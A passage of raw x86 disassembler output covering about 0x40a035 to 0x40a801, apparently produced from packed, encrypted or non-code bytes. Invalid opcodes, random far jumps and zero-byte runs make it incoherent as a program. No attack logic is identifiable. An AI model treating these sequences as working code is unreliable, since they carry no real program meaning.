  40a035:	rol    BYTE PTR [ebx+0x4587eb10],0xe8
  40a03c:	sbb    eax,0x64ca0446
  40a041:	mov    DWORD PTR [ebp-0xc],eax
  40a044:	addr16 xor eax,0x8bc6c103
  40a04a:	inc    esi
  40a04b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a04c:	dec    esi
  40a04d:	mov    DWORD PTR [ebp+0x3c],esi
  40a050:	outs   dx,BYTE PTR ds:[esi]
  40a051:	inc    esp
  40a052:	in     al,0x34
  40a054:	das    
  40a055:	pop    ss
  40a056:	add    cl,BYTE PTR [edx+eax*4+0x7f9375be]
  40a05d:	std    
  40a05e:	or     al,BYTE PTR [eax]
  40a060:	add    BYTE PTR [eax],al
  40a062:	add    BYTE PTR [eax],al
  40a064:	iret   
  40a065:	in     al,dx
  40a066:	push   0x8bc51701
  40a06b:	dec    ebp
  40a06c:	cmp    al,0xc7
  40a06e:	cmp    DWORD PTR [ebx],edx
  40a070:	pop    esi
  40a071:	push   es
  40a072:	jmp    0x40a095
  40a074:	mov    ebp,DWORD PTR [edx-0x8]
  40a077:	mov    esi,DWORD PTR [ebp-0x6a]
  40a07a:	out    0x8c,al
  40a07c:	loopne 0x40a089
  40a07e:	fucomi st,st(7)
  40a080:	imul   ebx,ebp,0x5f3d8b02
  40a086:	mov    esp,0x48646577
  40a08b:	loopne 0x40a07b
  40a08d:	stc    
  40a08e:	ficom  DWORD PTR [eax-0x74fd227a]
  40a094:	enter  0x77d7,0x7c
  40a098:	sub    ecx,edx
  40a09a:	inc    esi
  40a09b:	in     al,dx
  40a09c:	out    dx,al
  40a09d:	push   ds
  40a09e:	lock mov al,al
  40a0a1:	iret   
  40a0a2:	add    BYTE PTR [ebp+ebx*1+0x4],0x79
  40a0a7:	out    dx,eax
  40a0a8:	and    ecx,DWORD PTR ds:[eax]
  40a0ab:	jl     0x40a085
  40a0ad:	cwde   
  40a0ae:	xor    eax,0x28f31e8
  40a0b3:	add    BYTE PTR [ebx-0x6d],al
  40a0b6:	mov    ch,0xec
  40a0b8:	je     0x40a095
  40a0ba:	test   esi,edi
  40a0bc:	pop    ebx
  40a0bd:	cli    
  40a0be:	js     0x40a104
  40a0c0:	lds    esi,FWORD PTR [edx+0x47]
  40a0c3:	cld    
  40a0c4:	clc    
  40a0c5:	pop    esi
  40a0c6:	daa    
  40a0c7:	inc    BYTE PTR [eax]
  40a0c9:	add    BYTE PTR [eax],al
  40a0cb:	add    BYTE PTR [eax],al
  40a0cd:	ret    0x7b70
  40a0d0:	inc    esp
  40a0d1:	imul   esp,DWORD PTR [edx+0x6f],0xfec6fef8
  40a0d8:	mov    ch,BYTE PTR [eax]
  40a0da:	inc    edi
  40a0db:	add    ebp,0x174c438e
  40a0e1:	ja     0x40a0be
  40a0e3:	ja     0x40a161
  40a0e5:	cmp    DWORD PTR [ecx-0x248e8181],0xda0f0a75
  40a0ef:	pop    eax
  40a0f0:	add    al,0x22
  40a0f2:	inc    ebx
  40a0f3:	add    dh,BYTE PTR [esi+0x74]
  40a0f6:	add    ch,cl
  40a0f8:	cmc    
  40a0f9:	jo     0x40a0ff
  40a0fb:	xchg   esp,eax
  40a0fc:	adc    eax,0x138303cf
  40a101:	call   0x5d948846
  40a106:	bnd jnp 0x40a10b
  40a109:	jne    0x40a0e5
  40a10b:	xchg   BYTE PTR [esi+0x74],dh
  40a10e:	add    cl,BYTE PTR [edi+0x6a10b37a]
  40a114:	inc    edi
  40a115:	xor    DWORD PTR [edx],ebp
  40a117:	push   0xffffffc4
  40a119:	pop    ecx
  40a11a:	jmp    0x672e8d4a
  40a11f:	in     eax,0x76
  40a121:	loope  0x40a19f
  40a123:	dec    ebx
  40a124:	clc    
  40a125:	inc    DWORD PTR [ecx+ebx*8-0xc]
  40a129:	and    cl,BYTE PTR ds:0xc6b820a9
  40a12f:	imul   eax,eax,0x0
  40a135:	add    BYTE PTR [edx-0x14078a07],dh
  40a13b:	retf   0xbb01
  40a13e:	pop    edi
  40a13f:	jmp    0x8f30f60f
  40a144:	clc    
  40a145:	in     eax,dx
  40a146:	fucomi st,st(0)
  40a148:	cmp    al,BYTE PTR [ecx+0x2118fe12]
  40a14e:	mov    esi,0x4dbea5b
  40a153:	cmp    ch,bl
  40a155:	add    ebp,esi
  40a157:	icebp  
  40a158:	arpl   bp,si
  40a15a:	sub    edi,esi
  40a15c:	gs jbe 0x40a104
  40a15f:	fprem1 
  40a161:	fidiv  WORD PTR [ebp+0x2]
  40a164:	inc    eax
  40a165:	sbb    ebx,DWORD PTR [ebx+0x39784de8]
  40a16b:	cli    
  40a16c:	jno    0x40a199
  40a16e:	inc    bh
  40a170:	push   eax
  40a171:	loop   0x40a1a2
  40a173:	add    eax,DWORD PTR [eax]
  40a175:	jmp    0x55287276
  40a17a:	pusha  
  40a17b:	call   0xf323c87e
  40a180:	out    0x16,eax
  40a182:	inc    edx
  40a183:	add    eax,DWORD PTR [eax]
  40a185:	arpl   WORD PTR ds:0x61ba08dd,si
  40a18b:	outs   dx,DWORD PTR ds:[esi]
  40a18c:	or     BYTE PTR [ecx],dl
  40a18e:	and    eax,0xaefefeed
  40a193:	dec    eax
  40a194:	pop    ebx
  40a195:	and    BYTE PTR [eax+eax*1],dh
  40a198:	add    BYTE PTR [eax+eax*1+0x0],dl
  40a19f:	lods   eax,DWORD PTR ds:[esi]
  40a1a0:	fild   DWORD PTR [eax+0x339d5]
  40a1a6:	jmp    0x6297f276
  40a1ab:	mov    edx,?
  40a1ad:	mov    bl,cl
  40a1af:	xchg   edx,eax
  40a1b0:	add    bh,bh
  40a1b2:	jns    0x40a195
  40a1b4:	add    al,BYTE PTR [eax]
  40a1b6:	jmp    0x4434f038
  40a1bb:	je     0x40a207
  40a1bd:	mov    ebx,DWORD PTR [edi-0x17669f2f]
  40a1c3:	jbe    0x40a243
  40a1c5:	mov    edi,0xca62ee
  40a1ca:	jmp    0x315d1d45
  40a1cf:	addr16 inc edx
  40a1d1:	add    BYTE PTR [ebx],dl
  40a1d3:	jne    0x40a24a
  40a1d5:	inc    esp
  40a1d6:	jne    0x40a1f9
  40a1d8:	jb     0x40a166
  40a1da:	sub    DWORD PTR [ecx+0x52],esi
  40a1dd:	call   FWORD PTR [edx+0x6c0bc3fa]
  40a1e3:	mov    cl,0x73
  40a1e5:	sbb    bl,dl
  40a1e7:	jne    0x40a25e
  40a1e9:	inc    esp
  40a1ea:	pop    ebp
  40a1eb:	cmp    DWORD PTR [edx-0x74],ebp
  40a1ee:	test   eax,0xff5276
  40a1f3:	outs   dx,DWORD PTR ds:[esi]
  40a1f4:	jg     0x40a1b8
  40a1f6:	or     al,0x19
  40a1f8:	mov    esi,0xfe1e850d
  40a1fd:	(bad)  
  40a1fe:	call   ecx
  40a200:	xor    DWORD PTR [edx],0xff
  40a206:	add    BYTE PTR [eax],al
  40a208:	xchg   ebx,eax
  40a209:	fisttp DWORD PTR [esi-0x18]
  40a20c:	pop    edi
  40a20d:	xchg   ecx,eax
  40a20e:	(bad)  
  40a20f:	dec    eax
  40a211:	mov    esi,0xfdcf840d
  40a216:	(bad)  
  40a217:	(bad)  
  40a218:	cli    
  40a219:	jg     0x40a1d6
  40a21b:	xor    al,0x43
  40a21d:	fdiv   st(5),st
  40a21f:	add    bh,BYTE PTR [ecx-0x1b428111]
  40a225:	(bad)  
  40a227:	call   DWORD PTR [ebx+0x47c092eb]
  40a22d:	and    al,0x66
  40a22f:	add    DWORD PTR [ecx],0x17
  40a232:	(bad)  
  40a233:	inc    DWORD PTR [ebx+0x14]
  40a236:	jne    0x40a253
  40a238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a239:	push   cs
  40a23a:	lea    eax,[ebp-0x22400]
  40a240:	pop    esp
  40a241:	inc    esi
  40a242:	xchg   esp,eax
  40a243:	mov    bl,BYTE PTR [esi+edi*8-0x58a02c02]
  40a24a:	or     dh,bh
  40a24c:	mov    ah,0xf4
  40a24e:	mov    edi,0xc80cfe
  40a253:	xor    bl,BYTE PTR [edi+eiz*2]
  40a256:	mov    edi,0x129580f
  40a25b:	add    ah,cl
  40a25d:	addr16 push es
  40a25f:	mov    ecx,DWORD PTR [ebx+ebp*2+0x0]
  40a263:	add    BYTE PTR [ecx+ebp*2+0x2a25f44c],bl
  40a26a:	call   0x40a2fa
  40a26f:	add    BYTE PTR [eax],al
  40a271:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a272:	ret    
  40a273:	inc    ebx
  40a274:	in     al,0x75
  40a276:	adc    DWORD PTR [edx+0x40],esi
  40a279:	jne    0x40a2dd
  40a27b:	jo     0x40a269
  40a27d:	lock xor edx,edi
  40a280:	adc    DWORD PTR [ecx-0x26],0x2
  40a284:	add    BYTE PTR [edx+0x69],bh
  40a287:	xchg   ebx,eax
  40a288:	add    BYTE PTR [ebp-0x25],dh
  40a28b:	ja     0x40a2d9
  40a28d:	push   ecx
  40a28e:	xchg   edx,eax
  40a28f:	add    edx,DWORD PTR [ecx-0x3b]
  40a292:	adc    eax,edi
  40a294:	xchg   esp,eax
  40a295:	jne    0x40a272
  40a297:	fist   DWORD PTR [esp+esi*2]
  40a29a:	fild   DWORD PTR [edx]
  40a29c:	mov    esi,DWORD PTR [edx-0x4]
  40a29f:	mov    dl,0x8f
  40a2a1:	je     0x40a27e
  40a2a3:	add    cl,BYTE PTR [ebp+0x275d2ea0]
  40a2a9:	int    0x60
  40a2ab:	mov    ecx,0x283f3e7
  40a2b0:	add    cl,bh
  40a2b2:	fwait
  40a2b3:	clc    
  40a2b4:	sbb    DWORD PTR ds:0x9f0002dc,0xffffffde
  40a2bb:	jne    0x40a301
  40a2bd:	add    DWORD PTR [edi+esi*2],ecx
  40a2c0:	inc    esp
  40a2c1:	mov    ebp,0xa914e90b
  40a2c6:	lds    eax,FWORD PTR [edx+0x0]
  40a2c9:	(bad)  
  40a2ca:	fadd   QWORD PTR [ebx-0x1762665c]
  40a2d0:	(bad)  
  40a2d1:	jne    0x40a32b
  40a2d3:	les    eax,FWORD PTR [ebx]
  40a2d5:	add    BYTE PTR [eax],al
  40a2d7:	add    BYTE PTR [eax],al
  40a2d9:	add    dh,dh
  40a2db:	xchg   edi,eax
  40a2dc:	test   DWORD PTR [edi+0x0],0xcafe185f
  40a2e3:	jl     0x40a2c0
  40a2e5:	sti    
  40a2e6:	aas    
  40a2e7:	fild   DWORD PTR [edx]
  40a2e9:	push   0xffffff89
  40a2eb:	adc    DWORD PTR [edi+0x4c],esi
  40a2ee:	in     eax,dx
  40a2ef:	inc    esi
  40a2f0:	jg     0x40a31d
  40a2f2:	stos   DWORD PTR es:[edi],eax
  40a2f3:	add    ah,BYTE PTR [esi-0x17]
  40a2f6:	call   0xd382:0x7503dd30
  40a2fd:	stos   DWORD PTR es:[edi],eax
  40a2fe:	xchg   edx,eax
  40a2ff:	hlt    
  40a300:	fs mov dh,0x8a
  40a303:	in     eax,0xe8
  40a305:	add    DWORD PTR [ecx],0xffffffa8
  40a308:	call   0xe8db9705
  40a30d:	add    esi,DWORD PTR [ebp+0x31]
  40a310:	adc    bl,BYTE PTR [esi+0x75]
  40a313:	inc    ecx
  40a314:	je     0x40a34d
  40a316:	inc    ebp
  40a317:	jns    0x40a337
  40a319:	fmul   QWORD PTR [eax-0x42]
  40a31c:	out    0x3,eax
  40a31e:	add    BYTE PTR [edi-0x28],bh
  40a321:	jmp    0x76d98871
  40a326:	mov    eax,0xbcab110e
  40a32b:	add    ch,cl
  40a32d:	clc    
  40a32e:	call   0x779ed569
  40a333:	dec    eax
  40a334:	lock xchg ecx,eax
  40a336:	pop    edx
  40a337:	add    cl,ch
  40a339:	add    ebp,esi
  40a33b:	ret    0xdb69
  40a33e:	add    BYTE PTR [eax],al
  40a340:	add    BYTE PTR [eax],al
  40a342:	add    BYTE PTR [esi+0x371d376e],dl
  40a348:	outs   dx,BYTE PTR ds:[esi]
  40a349:	sbb    ebx,DWORD PTR ds:0x1cfc6e37
  40a34f:	aaa    
  40a350:	outs   dx,BYTE PTR ds:[esi]
  40a351:	lock test dl,bl
  40a354:	inc    ebx
  40a355:	xor    eax,0x1cc09e0d
  40a35a:	arpl   WORD PTR [esi-0x11b8ec40],cx
  40a360:	ds loope 0x40a3df
  40a363:	ror    BYTE PTR [esi-0x72],cl
  40a366:	mov    bl,0xf6
  40a368:	add    ch,cl
  40a36a:	add    ecx,ebp
  40a36c:	out    dx,al
  40a36d:	lock add eax,0x22ffd975
  40a373:	stc    
  40a374:	gs mov ecx,0x8b3e1bea
  40a37a:	lods   al,BYTE PTR ds:[esi]
  40a37b:	sahf   
  40a37c:	ja     0x40a37d
  40a37e:	mov    dh,0x19
  40a380:	xchg   ebp,eax
  40a381:	sub    eax,0x76
  40a384:	add    ch,al
  40a386:	or     DWORD PTR [eax+0x47520002],0x24f14479
  40a390:	cmp    DWORD PTR [edi-0x47c9141f],0xffcf9841
  40a39a:	call   0x10c3a7e0
  40a39f:	mov    edx,0x10c2096e
  40a3a4:	outs   dx,DWORD PTR ds:[esi]
  40a3a5:	pop    ss
  40a3a6:	popa   
  40a3a7:	add    BYTE PTR [eax],al
  40a3a9:	add    BYTE PTR [eax],al
  40a3ab:	add    BYTE PTR [ebx-0x4115150e],bh
  40a3b1:	inc    esi
  40a3b2:	lock dec al
  40a3b5:	repnz push ebp
  40a3b7:	bound  esp,QWORD PTR [ebx+0x2e2782fa]
  40a3bd:	fdivr  QWORD PTR [eax-0x47]
  40a3c0:	jns    0x40a3c4
  40a3c2:	pop    edi
  40a3c3:	aas    
  40a3c4:	scas   al,BYTE PTR es:[edi]
  40a3c5:	mov    ecx,0x4d76edc1
  40a3ca:	mov    edi,DWORD PTR [ebp+0x68f7dff6]
  40a3d0:	sbb    eax,0x76e90330
  40a3d5:	dec    esp
  40a3d6:	push   0xffffffe9
  40a3d8:	dec    esp
  40a3d9:	add    cl,BYTE PTR [ebp-0x17ed6adb]
  40a3df:	mov    bh,0xb6
  40a3e1:	add    al,BYTE PTR [eax]
  40a3e3:	jb     0x40a449
  40a3e5:	cli    
  40a3e6:	mov    ch,bh
  40a3e8:	dec    edi
  40a3e9:	cmp    eax,DWORD PTR [eax+eiz*2]
  40a3ec:	lea    ebx,[esi]
  40a3ee:	or     al,0x0
  40a3f0:	inc    edi
  40a3f1:	or     BYTE PTR es:[ebx-0x7600fd7c],al
  40a3f8:	pop    eax
  40a3f9:	and    dl,BYTE PTR [eax]
  40a3fb:	mov    dl,BYTE PTR [edx+ebp*8-0x7f]
  40a3ff:	pusha  
  40a400:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a401:	inc    DWORD PTR [edi-0x75ed8fb4]
  40a407:	dec    eax
  40a408:	cdq    
  40a409:	addr16 dec ebx
  40a40b:	and    al,0x81
  40a40d:	push   0x8b0d
  40a412:	add    BYTE PTR [eax],al
  40a414:	add    ah,cl
  40a416:	jns    0x85371460
  40a41c:	leave  
  40a41d:	xor    ch,ah
  40a41f:	mov    DWORD PTR [ecx],eax
  40a421:	ss (bad) 
  40a423:	(bad)  
  40a424:	adc    BYTE PTR [ebx+0x108d0454],bl
  40a42a:	add    ecx,DWORD PTR [eax+ebp*8]
  40a42d:	int3   
  40a42e:	fscale 
  40a430:	inc    DWORD PTR [edx]
  40a432:	(bad)  
  40a433:	imul   ebp,edx,0x4d
  40a436:	dec    DWORD PTR [esp+esi*2-0x3a1918d0]
  40a43d:	pop    edi
  40a43e:	std    
  40a43f:	push   DWORD PTR [edx]
  40a441:	pop    esp
  40a442:	cmp    al,0x8b
  40a444:	in     eax,0xb9
  40a446:	rol    BYTE PTR [edx],0x0
  40a449:	popa   
  40a44a:	addr16 jmp 0x40a49e
  40a44d:	dec    edi
  40a44e:	xor    al,0x57
  40a450:	mov    esp,DWORD PTR [eax+ebp*2]
  40a453:	inc    esi
  40a454:	add    al,0x24
  40a456:	dec    ebx
  40a457:	mov    dl,0x0
  40a459:	or     al,0x68
  40a45b:	jbe    0x40a461
  40a45d:	pop    edi
  40a45e:	(bad)  
  40a45f:	cld    
  40a460:	add    BYTE PTR [ecx+0x3d],cl
  40a463:	or     al,0x53
  40a465:	sbb    edx,DWORD PTR [edx]
  40a467:	sbb    BYTE PTR [edx],dl
  40a469:	mov    esi,?
  40a46b:	mov    al,BYTE PTR [esi]
  40a46d:	jne    0x40a4c5
  40a46f:	ret    
  40a470:	jae    0x40a4d6
  40a472:	pusha  
  40a473:	ins    DWORD PTR es:[edi],dx
  40a474:	add    al,0xf6
  40a476:	mov    edx,0x7402
  40a47b:	add    BYTE PTR [eax],al
  40a47d:	add    BYTE PTR [esi+0x64],dh
  40a480:	inc    eax
  40a481:	cld    
  40a482:	not    BYTE PTR [edx+0x672047fe]
  40a488:	push   edx
  40a489:	dec    DWORD PTR [eax+0x754011fd]
  40a48f:	pop    edx
  40a490:	push   0x2d9b7fc
  40a495:	add    BYTE PTR [ebx],al
  40a497:	loopne 0x40a512
  40a499:	dec    esp
  40a49a:	ins    DWORD PTR es:[edi],dx
  40a49b:	push   esi
  40a49c:	mov    esp,0x4703173
  40a4a1:	jmp    0x40a454
  40a4a3:	(bad)  
  40a4a6:	push   ebp
  40a4a7:	inc    ebx
  40a4a8:	add    al,0x0
  40a4aa:	out    dx,al
  40a4ab:	(bad)  
  40a4ac:	cli    
  40a4ad:	mov    ah,BYTE PTR [ebp+0x67]
  40a4b0:	in     eax,dx
  40a4b1:	jae    0x40a44c
  40a4b3:	test   DWORD PTR [edx],eax
  40a4b5:	push   esi
  40a4b6:	(bad)  
  40a4b8:	mov    WORD PTR [edi],?
  40a4ba:	jne    0x40a50e
  40a4bc:	add    eax,0x79e7bb89
  40a4c1:	jle    0x40a53c
  40a4c3:	add    DWORD PTR [edx],0x0
  40a4c6:	jge    0x40a4b3
  40a4c8:	fidivr DWORD PTR [edx-0x19]
  40a4cb:	jmp    0x40a4cf
  40a4cd:	test   BYTE PTR ds:0x1d561237,dh
  40a4d3:	popf   
  40a4d4:	fiadd  DWORD PTR [eax]
  40a4d6:	jne    0x40a53e
  40a4d8:	leave  
  40a4d9:	jae    0x40a548
  40a4db:	push   esp
  40a4dc:	add    DWORD PTR [ebx-0xfcc9d2],ecx
  40a4e2:	add    BYTE PTR [eax],al
  40a4e4:	add    BYTE PTR [eax],al
  40a4e6:	add    BYTE PTR [ebp-0x43a4ba08],al
  40a4ec:	lods   eax,DWORD PTR ds:[esi]
  40a4ed:	(bad)  
  40a4ee:	dec    DWORD PTR [eax+0x2]
  40a4f1:	jb     0x40a4cb
  40a4f3:	imul   esi
  40a4f5:	in     al,dx
  40a4f6:	push   eax
  40a4f7:	xchg   BYTE PTR [ebp-0x2c01b2c2],bh
  40a4fd:	pop    edi
  40a4fe:	inc    edi
  40a4ff:	rcr    DWORD PTR ds:0x8b6070aa,0x23
  40a506:	lock call 0xe86c:0x7502f7a5
  40a50e:	jp     0x40a549
  40a510:	fcmovbe st,st(2)
  40a512:	sti    
  40a513:	jmp    0x9e94fa5f
  40a518:	push   es
  40a519:	ret    
  40a51a:	add    ah,BYTE PTR [esi]
  40a51c:	xor    eax,0x356d3f62
  40a521:	call   0x7501:0xa5648d50
  40a528:	lea    esi,[eax]
  40a52a:	sub    DWORD PTR [esi+0x56],ebp
  40a52d:	(bad)  
  40a52e:	fcmovnu st,st(6)
  40a530:	push   ebx
  40a531:	call   0x5ff54b39
  40a536:	jl     0x40a59f
  40a538:	add    ch,cl
  40a53a:	in     al,dx
  40a53b:	inc    ebp
  40a53c:	lea    esp,ds:0xc27a3483
  40a542:	add    esi,DWORD PTR [ebp+0x34]
  40a545:	(bad)  
  40a546:	sub    eax,0x2a3301d
  40a54b:	add    BYTE PTR [eax],al
  40a54d:	add    BYTE PTR [eax],al
  40a54f:	add    BYTE PTR [ebp-0x75],dh
  40a552:	mov    ds:0x66c55fe7,eax
  40a557:	sub    DWORD PTR [ebp+0x3f],ebx
  40a55a:	in     eax,dx
  40a55b:	outs   dx,DWORD PTR ds:[esi]
  40a55c:	dec    ebx
  40a55d:	lea    edi,ds:0xc0cbfe74
  40a563:	ja     0x40a578
  40a565:	add    ebp,ecx
  40a567:	pop    ebp
  40a568:	neg    cl
  40a56a:	(bad)  
  40a56b:	jno    0x40a508
  40a56d:	(bad)  
  40a56e:	jmp    FWORD PTR [edx]
  40a570:	sbb    DWORD PTR ds:0x8f7435c3,0x56d1d557
  40a57a:	add    al,0x6c
  40a57c:	xor    al,0x4a
  40a57e:	divps  xmm1,xmm6
  40a581:	xlat   BYTE PTR ds:[ebx]
  40a582:	fdiv   st,st(2)
  40a584:	push   DWORD PTR [ebx]
  40a586:	and    esi,DWORD PTR [ecx-0xe8b1ed9]
  40a58c:	sub    eax,DWORD PTR [edi+0x8]
  40a58f:	or     DWORD PTR [edx+0x1de8ffb4],0x8c98e7d8
  40a599:	loopne 0x40a599
  40a59b:	jb     0x40a5f0
  40a59d:	ficomp WORD PTR [esi-0x49]
  40a5a0:	cmp    eax,0x76e1c1cb
  40a5a5:	aaa    
  40a5a6:	mov    edx,DWORD PTR [ebp-0xb]
  40a5a9:	in     al,0xf7
  40a5ab:	push   0x4a
  40a5ad:	cld    
  40a5ae:	xchg   DWORD PTR [ebp+0x2932f68a],ebp
  40a5b4:	add    BYTE PTR [eax],al
  40a5b6:	add    BYTE PTR [eax],al
  40a5b8:	add    ch,al
  40a5ba:	push   0xf97aad89
  40a5bf:	xor    al,BYTE PTR [edx-0x40]
  40a5c2:	call   0x8757:0x276ec4f
  40a5c9:	mov    edi,0xf8ca2443
  40a5ce:	inc    ebx
  40a5cf:	and    al,0xef
  40a5d1:	jbe    0x40a55c
  40a5d3:	pop    ebx
  40a5d4:	int    0x86
  40a5d6:	mov    DWORD PTR [ebx-0x3b],ebx
  40a5d9:	jb     0x40a5a3
  40a5db:	inc    ebx
  40a5dc:	or     eax,0x5c8b0286
  40a5e1:	or     DWORD PTR [ebx+0x4d6cc106],0x9ffae901
  40a5eb:	push   cs
  40a5ec:	add    BYTE PTR [eax-0x2300017a],cl
  40a5f2:	ins    DWORD PTR es:[edi],dx
  40a5f3:	add    DWORD PTR [edx-0x27],ebp
  40a5f6:	jb     0x40a63a
  40a5f8:	and    al,0x74
  40a5fa:	push   ss
  40a5fb:	mov    eax,DWORD PTR [ebp-0x20]
  40a5fe:	ins    DWORD PTR es:[edi],dx
  40a5ff:	add    BYTE PTR [edx-0x24],ch
  40a602:	ins    DWORD PTR es:[edi],dx
  40a603:	add    al,0xe8
  40a605:	push   ecx
  40a606:	inc    edi
  40a607:	add    al,BYTE PTR [eax]
  40a609:	push   edi
  40a60a:	mov    dh,0x83
  40a60c:	test   bl,0x87
  40a60f:	adc    DWORD PTR [ecx],eax
  40a611:	pushf  
  40a612:	add    ebp,DWORD PTR [eax-0x78]
  40a615:	iret   
  40a616:	add    eax,DWORD PTR [eax]
  40a618:	(bad)  
  40a619:	jmp    0x40a606
  40a61b:	gs dec ecx
  40a61d:	add    BYTE PTR [eax],al
  40a61f:	add    BYTE PTR [eax],al
  40a621:	add    BYTE PTR [ebp+0x1ff88b03],cl
  40a627:	jecxz  0x40a628
  40a629:	jl     0x40a5c0
  40a62b:	jmp    0x40a652
  40a62d:	cli    
  40a62e:	mov    WORD PTR [ebx],es
  40a630:	mov    eax,edi
  40a632:	daa    
  40a633:	xor    BYTE PTR [ebx-0x326fd382],cl
  40a639:	call   0x407adb
  40a63e:	cmp    cl,BYTE PTR [eax-0x7a9cfb0a]
  40a644:	fadd   QWORD PTR [eax]
  40a646:	pop    esp
  40a647:	add    ecx,DWORD PTR [ebp-0xeca7b9]
  40a64d:	adc    eax,0x3ed644
  40a652:	fs push es
  40a654:	cli    
  40a655:	add    BYTE PTR [eax+edi*8],bl
  40a658:	mov    edi,0x1c27a089
  40a65d:	inc    eax
  40a65e:	(bad)  
  40a65f:	mov    esi,0xe11a75fd
  40a664:	inc    edx
  40a665:	and    al,0x23
  40a667:	cmp    DWORD PTR [edx+0x24],0x75
  40a66b:	call   0x3c37b575
  40a670:	jecxz  0x40a670
  40a672:	cli    
  40a673:	mov    cl,0x96
  40a675:	push   edx
  40a677:	call   0x91376691
  40a67c:	add    ecx,DWORD PTR [edi]
  40a67e:	icebp  
  40a67f:	add    DWORD PTR [edx],0x4f547500
  40a685:	and    al,0x0
  40a687:	add    BYTE PTR [eax],al
  40a689:	add    BYTE PTR [eax],al
  40a68b:	jno    0x40a6e1
  40a68d:	push   esp
  40a68e:	adc    al,dh
  40a690:	jle    0x40a6e8
  40a692:	add    esi,esi
  40a694:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a695:	lea    esp,cs:[ebx]
  40a698:	in     eax,dx
  40a699:	jmp    0xf666:0x2e9a366
  40a6a0:	add    BYTE PTR [esi],0xf
  40a6a3:	jmp    0x8901:0x517b8c50
  40a6aa:	fimul  DWORD PTR [ecx]
  40a6ac:	in     eax,0x1b
  40a6ae:	push   ds
  40a6af:	add    BYTE PTR [eax],al
  40a6b1:	xchg   DWORD PTR ds:0x6614b575,edi
  40a6b7:	lds    esp,FWORD PTR ds:[esi]
  40a6ba:	and    ebp,edx
  40a6bc:	lock mov es,WORD PTR [ebx-0x6f]
  40a6c0:	mov    edi,0xe942b711
  40a6c5:	lds    edi,FWORD PTR [esi*2-0x34005d11]
  40a6cc:	add    BYTE PTR [edx-0x7b],ch
  40a6cf:	dec    edx
  40a6d0:	cmp    ch,0x51
  40a6d3:	lock (bad) 
  40a6d5:	es sbb al,ch
  40a6d8:	scas   eax,DWORD PTR es:[edi]
  40a6d9:	es adc al,0x1d
  40a6dc:	pop    edi
  40a6dd:	jmp    0x40a6df
  40a6df:	jne    0x40a741
  40a6e1:	pop    edi
  40a6e2:	and    al,0x7d
  40a6e4:	retw   
  40a6e6:	je     0x40a758
  40a6e8:	add    ch,BYTE PTR [edi-0x17f3a6b8]
  40a6ee:	mov    WORD PTR [eax],es
  40a6f0:	add    BYTE PTR [eax],al
  40a6f2:	add    BYTE PTR [eax],al
  40a6f4:	push   0x61285c89
  40a6f9:	jmp    0xe14e:0xddfadb43
  40a700:	ss or  BYTE PTR es:[esi+ebp*2+0x6803e726],al
  40a709:	das    
  40a70a:	inc    edi
  40a70b:	sbb    eax,0x10ca2659
  40a710:	stc    
  40a711:	mov    ch,0x9e
  40a713:	loope  0x40a6e0
  40a715:	mov    DWORD PTR [eax+ebp*1],ebp
  40a718:	mov    DWORD PTR gs:[ebx],ebx
  40a71b:	hlt    
  40a71c:	in     eax,dx
  40a71d:	add    esi,DWORD PTR [edx+0x47]
  40a720:	mov    DWORD PTR [ecx-0x747ed7d4],ecx
  40a726:	loopne 0x40a6bb
  40a728:	jne    0x40a767
  40a72a:	(bad)  
  40a72c:	out    dx,al
  40a72d:	out    0xc3,eax
  40a72f:	lds    eax,FWORD PTR [edx-0x73cfaefe]
  40a735:	add    ch,cl
  40a737:	loopne 0x40a73f
  40a739:	es stc 
  40a73b:	jmp    0x40a726
  40a73d:	in     eax,0xe7
  40a73f:	add    esp,DWORD PTR [edi-0x3e18ae3e]
  40a745:	mov    DWORD PTR [ebx+esi*1-0x3a],eax
  40a749:	mov    DWORD PTR [eax],edx
  40a74b:	lea    esi,[ecx+0x5298f60e]
  40a751:	in     eax,0x33
  40a753:	je     0x40a7ca
  40a755:	add    ah,BYTE PTR [ecx+0x47]
  40a758:	add    BYTE PTR [eax],al
  40a75a:	add    BYTE PTR [eax],al
  40a75c:	add    BYTE PTR [ecx-0x7a],al
  40a75f:	sub    BYTE PTR [edi+0x71],dl
  40a762:	adc    DWORD PTR [ecx],ebp
  40a764:	in     eax,dx
  40a765:	mov    cl,0x35
  40a767:	xchg   ecx,eax
  40a768:	adc    esi,DWORD PTR [esi+0x2]
  40a76b:	add    cl,ch
  40a76d:	push   cs
  40a76e:	inc    edx
  40a76f:	out    0xe8,eax
  40a771:	jbe    0x40a6fa
  40a773:	mov    edi,0x168675d
  40a778:	fisub  WORD PTR [ebx+0x394fe7de]
  40a77e:	add    al,BYTE PTR [eax]
  40a780:	bound  ebx,QWORD PTR [esi]
  40a782:	call   0x8616a188
  40a787:	(bad)  
  40a788:	xor    al,0x7d
  40a78a:	adc    eax,eax
  40a78c:	ret    0x89ab
  40a78f:	add    ah,BYTE PTR [edx-0xa]
  40a792:	mov    WORD PTR [eax],es
  40a794:	jmp    0x7090dc0f
  40a799:	xor    ebx,esi
  40a79b:	mov    ch,BYTE PTR [eiz*2+0x71142f9c]
  40a7a2:	add    dl,BYTE PTR [esi+0x72]
  40a7a5:	(bad)
  40a7a8:	pop    eax
  40a7a9:	ja     0x40a7ad
  40a7ab:	test   BYTE PTR [ecx-0x4500d8b6],ch
  40a7b1:	jmp    0x7a13b003
  40a7b6:	add    eax,0x8cea49f1
  40a7bc:	sub    DWORD PTR [edi+0x2],esi
  40a7bf:	call   esp
  40a7c1:	add    BYTE PTR [eax],al
  40a7c3:	add    BYTE PTR [eax],al
  40a7c5:	add    BYTE PTR [edx-0x5326ab79],bl
  40a7cb:	push   0xccf9a12c
  40a7d0:	out    0xb4,eax
  40a7d2:	jmp    0xc57:0x36650002
  40a7d9:	jb     0x40a858
  40a7db:	push   0xdd257201
  40a7e0:	pminub mm6,QWORD PTR [esi]
  40a7e3:	jmp    0x3e6e09e9
  40a7e8:	pop    edi
  40a7e9:	add    bh,dl
  40a7eb:	enter  0xcc0,0x1c
  40a7ef:	adc    eax,0x8efdec8b
  40a7f4:	dec    BYTE PTR [edx+0x575607f9]
  40a7fa:	xchg   DWORD PTR [esi-0x72],edi
  40a7fd:	add    DWORD PTR [eax+eax*1],ebx
  40a800:	push   edi
  40a801:	push   0x10
